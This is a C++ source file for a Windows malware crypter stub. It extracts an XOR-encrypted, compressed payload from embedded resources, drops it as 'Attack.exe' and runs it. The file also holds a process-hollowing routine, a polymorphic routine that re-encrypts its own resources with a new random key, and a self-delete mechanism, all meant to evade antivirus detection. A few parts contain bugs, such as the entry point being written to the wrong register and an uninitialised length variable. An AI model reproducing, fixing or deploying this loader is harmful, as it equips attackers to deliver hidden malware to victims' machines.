#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <windows.h>
#include <wincrypt.h>
#include<zlib.h>
#include<iostream>

#define BUFFER_RSRC_ID 10
#define FILE_SIZE_RSRC_ID 20
#define KEY_RSRC_ID 30

#define KEY_LEN 64

typedef struct _FileStruct
{
	PBYTE pBuffer;
	DWORD dwBufSize;
	DWORD dwFileSize;
	PBYTE pKey;
} FileStruct;


FileStruct* ExtractPayload()
{
	FileStruct* fs = (FileStruct*)malloc(sizeof(FileStruct));
	if (fs == NULL)
		return NULL;

	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(BUFFER_RSRC_ID), RT_RCDATA);
	if (hRsrc == NULL)
	{
		std::cout << std::endl << "Find buffer resource error: " << GetLastError();
		free(fs);
		return NULL;
	}
	fs->dwBufSize = SizeofResource(NULL, hRsrc);

	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
	{
		std::cout << std::endl << "Load buffer resource error: " << GetLastError();
		free(fs);
		return NULL;
	}

	fs->pBuffer = (PBYTE)LockResource(hGlobal);
	if (fs->pBuffer == NULL)
	{
		std::cout << std::endl << "Lock buffer resource error: " << GetLastError();
		free(fs);
		return NULL;
	}

	hRsrc = FindResource(NULL, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), RT_RCDATA);
	if (hRsrc == NULL)
	{
		std::cout << std::endl << "Find file size error: " << GetLastError();
		free(fs);
		return NULL;
	}

	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
	{
		std::cout << std::endl << "Load buffer resource error: " << GetLastError();
		free(fs);
		return NULL;
	}
	fs->dwFileSize = *(LPDWORD)LockResource(hGlobal);

	hRsrc = FindResource(NULL, MAKEINTRESOURCE(KEY_RSRC_ID), RT_RCDATA);
	if (hRsrc == NULL)
	{
		std::cout << std::endl << "Find key resource error: " << GetLastError();
		free(fs);
		return NULL;
	}

	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
	{
		std::cout << std::endl << "Load key resource error: " << GetLastError();
		free(fs);
		return NULL;
	}
	fs->pKey = (PBYTE)LockResource(hGlobal);
	if (fs->pKey == NULL)
	{
		std::cout << std::endl << "Lock buffer resource error: " << GetLastError();
		free(fs);
		return NULL;
	}
	return fs;
}

BOOL DecryptPayload(FileStruct* fs)
{
	PBYTE pDecryptedPayloadBuffer = (PBYTE)malloc(fs->dwBufSize);
	if (pDecryptedPayloadBuffer == NULL)
		return FALSE;

	for (DWORD i = 0; i < fs->dwBufSize; i++)
	{
		pDecryptedPayloadBuffer[i] = fs->pBuffer[i] ^ fs->pKey[i % KEY_LEN];
	}

	fs->pBuffer = pDecryptedPayloadBuffer;

	return TRUE;
}

BOOL Encrypt(FileStruct* fs)
{
	return DecryptPayload(fs);
}

BOOL DecompressPayload(FileStruct* fs)
{
	PBYTE pDecompressedPayloadBuffer = (PBYTE)malloc(fs->dwFileSize);
	ULONG ulDecompressedBufferSize;
	uncompress(pDecompressedPayloadBuffer, &ulDecompressedBufferSize, fs->pBuffer, fs->dwFileSize);

	fs->pBuffer = pDecompressedPayloadBuffer;
	fs->dwBufSize = ulDecompressedBufferSize;

	return TRUE;
}

VOID DropAndExecutePayload(FileStruct* fs, LPCSTR szFileName)
{
	DWORD dwWritten;
	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, fs->pBuffer, fs->dwFileSize, &dwWritten, NULL);
	CloseHandle(hFile);
	ShellExecute(NULL, NULL, szFileName, NULL, NULL, SW_NORMAL);
}

BOOL GenerateKey(FileStruct* fs)
{
	fs->pKey = (PBYTE)malloc(KEY_LEN);
	if (fs->pKey == NULL)
		return FALSE;

	HCRYPTPROV hProv = NULL;
	if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT) == FALSE)
	{
		std::cout << std::endl << "Crypt acquire context error: " << GetLastError();
		free(fs->pKey);
		return FALSE;
	}

	std::cout << std::endl << std::endl << "Generating cryptographically secure bytes...";
	if (CryptGenRandom(hProv, KEY_LEN, fs->pKey) == FALSE)
	{
		std::cout << std::endl << "Generate random key error: " << GetLastError();
		free(fs->pKey);
		return NULL;
	}

	CryptReleaseContext(hProv, 0);
	return TRUE;
}

VOID SelfDelete(LPCSTR szFileName)
{
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);

	CreateFile("old.exe", 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
	CHAR szCmdLine[MAX_PATH];
	sprintf_s(szCmdLine, "%s delete", szFileName);
	if (CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) == FALSE)
	{
		std::cout << std::endl << "Create process error: " << GetLastError();
	}
}

BOOL UpdateResources(FileStruct* fs, LPCSTR szFileName)
{
	HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);

	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs->pBuffer, fs->dwBufSize) == FALSE)
	{
		std::cout << std::endl << "Update resource error: " << GetLastError();
		return FALSE;
	}

	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs->pKey, KEY_LEN) == FALSE)
	{
		std::cout << std::endl << "Update resource error: " << GetLastError();
		return FALSE;
	}

	if (EndUpdateResource(hUpdate, FALSE) == FALSE)
	{
		std::cout << std::endl << "End update resource error: " << GetLastError();
	}

	return TRUE;
}

BOOL PolymorphPayload(LPCSTR szFileName)
{
	MoveFile(szFileName, "old.exe");
	CopyFile("old.exe", szFileName, NULL);

	FileStruct* fs = ExtractPayload();
	if (fs == NULL)
		return FALSE;

	if (DecryptPayload(fs) == FALSE)
	{
		std::cout << std::endl << "DecryptPayload buffer error: " << GetLastError();
		free(fs);
		return FALSE;
	}

	if (GenerateKey(fs) == FALSE)
	{
		std::cout << std::endl << "Generate key error: " << GetLastError();
		free(fs);
		return FALSE;
	}

	if (Encrypt(fs) == FALSE)
	{
		std::cout << std::endl << "Encrypt buffer error: " << GetLastError();
		free(fs->pKey);
		free(fs);
		return FALSE;
	}

	if (UpdateResources(fs, szFileName) == FALSE)
	{
		free(fs->pKey);
		free(fs);
		return FALSE;
	}

	SelfDelete(szFileName);

	free(fs->pKey);
	free(fs);

	return TRUE;
}

BOOL MemoryExecutePayload(FileStruct* fs) {
	// PE headers
	PIMAGE_DOS_HEADER pidh;
	PIMAGE_NT_HEADERS pinh;
	PIMAGE_SECTION_HEADER pish;
	typedef VOID(*PZUVOS)(HANDLE, PVOID);

	// process info
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// pointer to virtually allocated memory
	LPVOID lpAddress = NULL;

	// context of suspended thread for setting address of entry point
	CONTEXT context;

	// need function pointer for ZwUnmapViewOfSection from ntdll.dll
	PZUVOS pZwUnmapViewOfSection = NULL;

	// get file name
	CHAR szFileName[MAX_PATH];
	GetModuleFileNameA(NULL, szFileName, MAX_PATH);

	// first extract header info 
	// check if valid DOS header
	pidh = (PIMAGE_DOS_HEADER)fs->pBuffer;
	if (pidh->e_magic != IMAGE_DOS_SIGNATURE) {
		std::cout << std::endl << "DOS signature error";
		return FALSE;
	}

	// check if valid pe file
	pinh = (PIMAGE_NT_HEADERS)((DWORD)fs->pBuffer + pidh->e_lfanew);
	if (pinh->Signature != IMAGE_NT_SIGNATURE) {
		std::cout << std::endl << "PE signature error";
		return FALSE;
	}

	// first create process as suspended
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(si);
	if (CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi) == FALSE) {
		std::cout << std::endl << "Create process error: " << GetLastError();
		return FALSE;
	}

	context.ContextFlags = CONTEXT_FULL;
	if (GetThreadContext(pi.hThread, &context) == FALSE) {
		std::cout << std::endl << "Get thread context error.";
	}

	// unmap memory space for our process
	pZwUnmapViewOfSection = (PZUVOS)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwUnmapViewOfSection");
	pZwUnmapViewOfSection(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase);

	// allocate virtual space for process
	lpAddress = VirtualAllocEx(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAddress == NULL) {
		std::cout << std::endl << "Virtual alloc error: " << GetLastError();
		return FALSE;
	}

	// write headers into memory
	if (WriteProcessMemory(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase, fs->pBuffer, pinh->OptionalHeader.SizeOfHeaders, NULL) == FALSE) {
		std::cout << std::endl << "Write headers error: " << GetLastError();
		return FALSE;
	}

	// write each section into memory
	for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
		// calculate section header of each section
		pish = (PIMAGE_SECTION_HEADER)((DWORD)fs->pBuffer + pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
		// write section data into memory
		WriteProcessMemory(pi.hProcess, (PVOID)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), (LPVOID)((DWORD)fs->pBuffer + pish->PointerToRawData), pish->SizeOfRawData, NULL);
	}

	// set starting address at virtual address: address of entry point
	context.SegEs = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
	if (SetThreadContext(pi.hThread, &context) == FALSE) {
		std::cout << std::endl << "Set thread context error: " << GetLastError();
		return FALSE;
	}

	// resume our suspended processes
	if (ResumeThread(pi.hThread) == -1) {
		std::cout << std::endl << "Resume thread error: " << GetLastError();
		return FALSE;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return TRUE;
}

/*
VOID RunFromMemory(FileStruct *fs) {
	Debug("%p", fs->pBuffer);
	HMEMORYMODULE hModule = MemoryLoadLibrary(fs->pBuffer, fs->dwFileSize);
	if (hModule == NULL) {
		Debug("Memory load library error: %lu\n", GetLastError());
		return;
	}

	int nSuccess = MemoryCallEntryPoint(hModule);
	if (nSuccess < 0) {
		Debug("Memory call entry point error: %d\n", nSuccess);
	}

	MemoryFreeLibrary(hModule);
}
*/


int main()
{
	if (strstr(GetCommandLine(), "delete") != NULL)
	{
		while (DeleteFile("old.exe") == FALSE);
	}
	else
	{
		FileStruct* fs = ExtractPayload();
		if (fs == NULL)
		{
			// log
			return 1;
		}

		if (DecryptPayload(fs) == TRUE)
		{
			if (DecompressPayload(fs) == TRUE)
			{
				DropAndExecutePayload(fs, "Attack.exe");
				//MemoryExecutePayload(fs);
			}
		}
		free(fs->pBuffer);
		free(fs);

		CHAR szFileName[MAX_PATH];
		GetModuleFileName(NULL, szFileName, MAX_PATH);
		// PolymorphPayload(szFileName);
	}

	printf("\n\n");
	return 0;
}